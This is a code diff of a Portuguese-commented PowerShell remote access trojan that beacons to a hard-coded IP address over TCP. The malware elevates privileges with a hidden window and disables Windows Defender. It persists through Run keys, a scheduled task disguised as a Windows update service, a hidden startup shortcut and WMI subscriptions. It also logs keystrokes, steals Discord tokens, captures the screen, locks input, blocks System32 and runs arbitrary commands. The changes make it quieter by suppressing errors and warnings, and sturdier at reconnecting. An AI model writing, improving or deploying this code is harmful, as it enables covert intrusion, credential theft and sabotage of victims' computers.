@@ -8,7 +8,7 @@ Version: 10.0.19045.1
 #>
 
 # ===== CONFIGURACOES =====
-$serverIP = "198.1.195.194"  # ⚠️ MUDE PARA SEU IP
+$serverIP = "198.1.195.194"
 $serverPort = 4000
 $installName = "WinUpdateSvc"
 $mutexName = "Global\MicrosoftWindowsUpdateService"
@@ -23,10 +23,9 @@ $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIde
 
 if (-not $isAdmin) {
     try {
-        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
+        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs -ErrorAction SilentlyContinue
         exit
-    } catch {
-    }
+    } catch {}
 }
 
 # ===== LOGS FAKES =====
@@ -82,8 +81,6 @@ if ($isAdmin) {
     } catch {
         Write-Host "[!] Erro ao desabilitar Defender: $_" -ForegroundColor Red
     }
-} else {
-    Write-Host "[!] Sem privilégios de Admin - Defender não pode ser desabilitado completamente" -ForegroundColor Yellow
 }
 
 Start-Sleep -Seconds 1
@@ -98,12 +95,12 @@ Add-Type -Name Window -Namespace Console -MemberDefinition @'
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
-# ===== PERSISTÊNCIA AVANÇADA =====
+# ===== PERSISTÊNCIA =====
 $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
 
 Write-Host "[+] Configurando persistência..." -ForegroundColor Yellow
 
-New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
+New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force -ErrorAction SilentlyContinue | Out-Null
 
 if ($MyInvocation.MyCommand.Path -ne $scriptPath) {
     Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force -ErrorAction SilentlyContinue
@@ -111,17 +108,15 @@ if ($MyInvocation.MyCommand.Path -ne $scriptPath) {
 
 try {
     $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-    Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
+    Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
     
     if ($isAdmin) {
         $regPathLM = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-        Set-ItemProperty -Path $regPathLM -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
+        Set-ItemProperty -Path $regPathLM -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
     }
     
     Write-Host "[OK] Persistência Registry configurada" -ForegroundColor Green
-} catch {
-    Write-Host "[!] Erro no Registry: $_" -ForegroundColor Red
-}
+} catch {}
 
 if ($isAdmin) {
     try {
@@ -135,12 +130,10 @@ if ($isAdmin) {
         $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd
         
         Unregister-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Confirm:$false -ErrorAction SilentlyContinue
-        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2,$trigger3 -Principal $principal -Settings $settings -Force | Out-Null
+        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2,$trigger3 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
         
         Write-Host "[OK] Task Scheduler configurado" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] Erro no Task Scheduler: $_" -ForegroundColor Red
-    }
+    } catch {}
 }
 
 try {
@@ -157,9 +150,7 @@ try {
     (Get-Item $lnkPath -Force).Attributes = 'Hidden'
     
     Write-Host "[OK] Startup Folder configurado" -ForegroundColor Green
-} catch {
-    Write-Host "[!] Erro no Startup Folder: $_" -ForegroundColor Red
-}
+} catch {}
 
 if ($isAdmin) {
     try {
@@ -186,12 +177,10 @@ if ($isAdmin) {
         Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
             Filter = $WMIEventFilter
             Consumer = $WMIEventConsumer
-        } | Out-Null
+        } -ErrorAction SilentlyContinue | Out-Null
         
         Write-Host "[OK] WMI Event Subscription configurado" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] Erro no WMI: $_" -ForegroundColor Red
-    }
+    } catch {}
 }
 
 Start-Sleep -Milliseconds 500
@@ -216,8 +205,8 @@ function Get-RATUsers {
 
 function Add-UserToList {
     param([string]$UserName)
-    New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
-    Add-Content -Path $userListFile -Value $UserName -Force
+    New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force -ErrorAction SilentlyContinue | Out-Null
+    Add-Content -Path $userListFile -Value $UserName -Force -ErrorAction SilentlyContinue
     return $true
 }
 
@@ -231,7 +220,7 @@ if (-not (Test-Path $userListFile)) {
     }
 }
 
-# ===== DESABILITAR ANTIVIRUS (COMANDO) =====
+# ===== DESABILITAR ANTIVIRUS =====
 function Disable-Antivirus {
     if (-not $isAdmin) {
         return "ANTIVIRUS_DISABLE_ERROR: Requer privilégios de administrador"
@@ -307,13 +296,13 @@ function Lock-Mouse {
             Start-Sleep -Milliseconds 10
         }
     }
-    Start-Job -ScriptBlock $global:mouseLockScript | Out-Null
+    Start-Job -ScriptBlock $global:mouseLockScript -ErrorAction SilentlyContinue | Out-Null
     return "MOUSE_LOCKED"
 }
 
 function Unlock-Mouse {
-    Get-Job | Where-Object { $_.State -eq 'Running' } | Stop-Job
-    Get-Job | Remove-Job -Force
+    Get-Job | Where-Object { $_.State -eq 'Running' } | Stop-Job -ErrorAction SilentlyContinue
+    Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
     return "MOUSE_UNLOCKED"
 }
 
@@ -370,13 +359,13 @@ function Lock-Keyboard {
             Start-Sleep -Milliseconds 100
         }
     }
-    Start-Job -ScriptBlock $global:keyboardLockScript | Out-Null
+    Start-Job -ScriptBlock $global:keyboardLockScript -ErrorAction SilentlyContinue | Out-Null
     return "KEYBOARD_LOCKED"
 }
 
 function Unlock-Keyboard {
-    Get-Job | Where-Object { $_.State -eq 'Running' } | Stop-Job
-    Get-Job | Remove-Job -Force
+    Get-Job | Where-Object { $_.State -eq 'Running' } | Stop-Job -ErrorAction SilentlyContinue
+    Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
     return "KEYBOARD_UNLOCKED"
 }
 
@@ -599,7 +588,7 @@ public static extern int GetAsyncKeyState(Int32 i);
                 }
             }
         }
-    }
+    } -ErrorAction SilentlyContinue
     return "KEYLOGGER_STARTED"
 }
 
@@ -608,8 +597,8 @@ function Stop-Keylogger {
     
     $global:keyloggerActive = $false
     if ($global:keyloggerJob) {
-        Stop-Job -Job $global:keyloggerJob
-        Remove-Job -Job $global:keyloggerJob -Force
+        Stop-Job -Job $global:keyloggerJob -ErrorAction SilentlyContinue
+        Remove-Job -Job $global:keyloggerJob -Force -ErrorAction SilentlyContinue
     }
     return "KEYLOGGER_STOPPED"
 }
@@ -652,81 +641,141 @@ function Uninstall-RAT {
     }
 }
 
-# ===== CONEXAO PRINCIPAL =====
+# ===== CONEXAO PRINCIPAL (CORRIGIDA) =====
 while ($true) {
     try {
-        $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
+        $client = New-Object System.Net.Sockets.TcpClient
+        $client.ReceiveTimeout = 0
+        $client.SendTimeout = 0
+        
+        $client.Connect($serverIP, $serverPort)
+        
         $stream = $client.GetStream()
+        $stream.ReadTimeout = 0
+        $stream.WriteTimeout = 5000
+        
         $writer = New-Object System.IO.StreamWriter($stream)
         $reader = New-Object System.IO.StreamReader($stream)
         $writer.AutoFlush = $true
         
+        # Enviar identificação
         $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
         
-        while ($client.Connected) {
-            $cmd = $reader.ReadLine()
-            if ([string]::IsNullOrEmpty($cmd)) { continue }
-            
-            switch -Wildcard ($cmd) {
-                "test" { $writer.WriteLine("PONG") }
-                "screenshot" { $writer.WriteLine((Get-ScreenCapture)) }
-                "click" { $writer.WriteLine((Click-Mouse)) }
-                "rightclick" { $writer.WriteLine((Click-RightMouse)) }
-                "discord" { $writer.WriteLine((Get-DiscordToken)) }
-                "processes" { $writer.WriteLine((Get-ProcessList)) }
-                "shutdown" { $writer.WriteLine((Power-Control "shutdown")) }
-                "reboot" { $writer.WriteLine((Power-Control "reboot")) }
-                "list_users" { $writer.WriteLine((Get-RATUsers)) }
-                "lock_mouse" { $writer.WriteLine((Lock-Mouse)) }
-                "unlock_mouse" { $writer.WriteLine((Unlock-Mouse)) }
-                "lock_keyboard" { $writer.WriteLine((Lock-Keyboard)) }
-                "unlock_keyboard" { $writer.WriteLine((Unlock-Keyboard)) }
-                "black_screen" { $writer.WriteLine((Enable-BlackScreen)) }
-                "unlock_screen" { $writer.WriteLine((Disable-BlackScreen)) }
-                "block_system32" { $writer.WriteLine((Block-System32)) }
-                "unblock_system32" { $writer.WriteLine((Unblock-System32)) }
-                "keylog_start" { $writer.WriteLine((Start-Keylogger)) }
-                "keylog_stop" { $writer.WriteLine((Stop-Keylogger)) }
-                "disable_antivirus" { $writer.WriteLine((Disable-Antivirus)) }
-                "enable_antivirus" { $writer.WriteLine((Enable-Antivirus)) }
-                "uninstall" { $writer.WriteLine((Uninstall-RAT)) }
-                "exit" { break }
-                "move *" { 
-                    $parts = $cmd -split " "
-                    $writer.WriteLine((Move-Mouse $parts[1] $parts[2]))
+        # Loop de comandos
+        while ($true) {
+            try {
+                # Verificar se tem dados disponíveis
+                if ($stream.DataAvailable) {
+                    $cmd = $reader.ReadLine()
+                    
+                    if ([string]::IsNullOrEmpty($cmd)) {
+                        Start-Sleep -Milliseconds 100
+                        continue
+                    }
+                    
+                    # Processar comando
+                    $response = ""
+                    
+                    switch -Wildcard ($cmd) {
+                        "test" { $response = "PONG" }
+                        "screenshot" { $response = Get-ScreenCapture }
+                        "click" { $response = Click-Mouse }
+                        "rightclick" { $response = Click-RightMouse }
+                        "discord" { $response = Get-DiscordToken }
+                        "processes" { $response = Get-ProcessList }
+                        "shutdown" { $response = Power-Control "shutdown" }
+                        "reboot" { $response = Power-Control "reboot" }
+                        "list_users" { $response = Get-RATUsers }
+                        "lock_mouse" { $response = Lock-Mouse }
+                        "unlock_mouse" { $response = Unlock-Mouse }
+                        "lock_keyboard" { $response = Lock-Keyboard }
+                        "unlock_keyboard" { $response = Unlock-Keyboard }
+                        "black_screen" { $response = Enable-BlackScreen }
+                        "unlock_screen" { $response = Disable-BlackScreen }
+                        "block_system32" { $response = Block-System32 }
+                        "unblock_system32" { $response = Unblock-System32 }
+                        "keylog_start" { $response = Start-Keylogger }
+                        "keylog_stop" { $response = Stop-Keylogger }
+                        "disable_antivirus" { $response = Disable-Antivirus }
+                        "enable_antivirus" { $response = Enable-Antivirus }
+                        "uninstall" { $response = Uninstall-RAT }
+                        "exit" { 
+                            $client.Close()
+                            break 
+                        }
+                        "move *" { 
+                            $parts = $cmd -split " "
+                            if ($parts.Length -ge 3) {
+                                $response = Move-Mouse $parts[1] $parts[2]
+                            } else {
+                                $response = "MOVE_ERROR: Formato inválido"
+                            }
+                        }
+                        "key *" { 
+                            $key = $cmd.Substring(4)
+                            $response = Send-Key $key
+                        }
+                        "exec *" { 
+                            $command = $cmd.Substring(5)
+                            $response = Execute-Command $command
+                        }
+                        "kill *" {
+                            $pid = $cmd.Substring(5)
+                            $response = Kill-ProcessByPID $pid
+                        }
+                        "list_files *" {
+                            $path = $cmd.Substring(11)
+                            $response = Get-FileList $path
+                        }
+                        "msgbox *" {
+                            $msg = $cmd.Substring(7)
+                            [System.Windows.Forms.MessageBox]::Show($msg, "Aviso", 0, 48) | Out-Null
+                            $response = "MSGBOX_SHOWN"
+                        }
+                        default { 
+                            $response = "Comando não reconhecido: $cmd"
+                        }
+                    }
+                    
+                    # Enviar resposta
+                    if (-not [string]::IsNullOrEmpty($response)) {
+                        try {
+                            $writer.WriteLine($response)
+                        } catch {
+                            # Erro ao enviar, reconectar
+                            break
+                        }
+                    }
+                } else {
+                    # Sem dados, aguardar um pouco
+                    Start-Sleep -Milliseconds 100
                 }
-                "key *" { 
-                    $key = $cmd.Substring(4)
-                    $writer.WriteLine((Send-Key $key))
+                
+                # Verificar se conexão ainda está ativa
+                if (-not $client.Connected) {
+                    break
                 }
-                "exec *" { 
-                    $command = $cmd.Substring(5)
-                    $writer.WriteLine((Execute-Command $command))
-                }
-                "kill *" {
-                    $pid = $cmd.Substring(5)
-                    $writer.WriteLine((Kill-ProcessByPID $pid))
-                }
-                "list_files *" {
-                    $path = $cmd.Substring(11)
-                    $writer.WriteLine((Get-FileList $path))
-                }
-                "msgbox *" {
-                    $msg = $cmd.Substring(7)
-                    [System.Windows.Forms.MessageBox]::Show($msg, "Aviso", 0, 48)
-                    $writer.WriteLine("MSGBOX_SHOWN")
-                }
-                default { 
-                    $writer.WriteLine("Comando não reconhecido: $cmd") 
-                }
+                
+            } catch {
+                # Erro no loop, sair para reconectar
+                break
             }
         }
+        
     } catch {
-        Start-Sleep -Seconds 10
+        # Erro de conexão, aguardar antes de tentar novamente
     } finally {
-        if ($client) { $client.Close() }
+        # Limpar recursos
+        if ($reader) { try { $reader.Close() } catch {} }
+        if ($writer) { try { $writer.Close() } catch {} }
+        if ($stream) { try { $stream.Close() } catch {} }
+        if ($client) { try { $client.Close() } catch {} }
     }
+    
+    # Aguardar antes de reconectar
+    Start-Sleep -Seconds 5
 }
 
+# Limpar mutex ao sair
 $mutex.ReleaseMutex()
 $mutex.Dispose()
